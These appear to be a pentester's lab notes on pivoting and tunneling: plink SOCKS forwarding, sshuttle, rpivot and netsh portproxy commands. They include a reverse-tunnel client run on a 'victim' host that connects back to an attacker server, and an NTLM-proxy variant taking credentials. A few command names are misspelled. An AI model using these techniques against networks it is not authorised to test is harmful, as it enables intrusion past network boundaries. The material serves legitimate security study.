### Plink
Plink is used for PuTTY link. This is a Windows SSH tool in the PuTTY Package.
```bash
plink -ssh -D 9050 ubuntu@10.129.15.50
```
Using another Windows tool called `Proxifier` can be used with a Socks Tunnel via SSH session that was created.
```bash
# Configurations
127.0.0.1 9050 SOCKS4

# Then use MSTSC.exe
```

# Sshuttle
Sshuttle is a python tool that will remove the need to configure Proxychains.
```bash
sudo apt-get install sshuttle

# Using -r to conncet to the host
# Using a .0 before the CIDR to claim the range of the IPs
sudo ssuttle -r ubuntu@IP Pivot_IP/CIDR -v

# Then you can route traffic through the configurations with 
sudo nmap -v -A -sT -p3389 Pivot_IP -Pn
```

### Rpivot
```bash
# Downloading the tool
git clone https://github.com/klsecservices/rpivot.git

# Getting the server.py running
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Before running, we need to transfer the client.py to the target
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

# Then on the victim run
python2 client.py --server-ip 10.10.14.18 --server-port 9999

# Finally you can browse on the target with
proxychains firefox-esr PIVOT_IP
proxychains curl http://PIVOT_IP:Port

# If there is a need to use a NTLM Auth
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

# Netsh
Windows based.
![[Pasted image 20260703211010.png]]
```powershell
# Command to run
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=KALI IP connectport=3389 connectaddress=172.16.5.25

# Verifying Port Forward
netsh.exe interface portproxy show v4tov4

```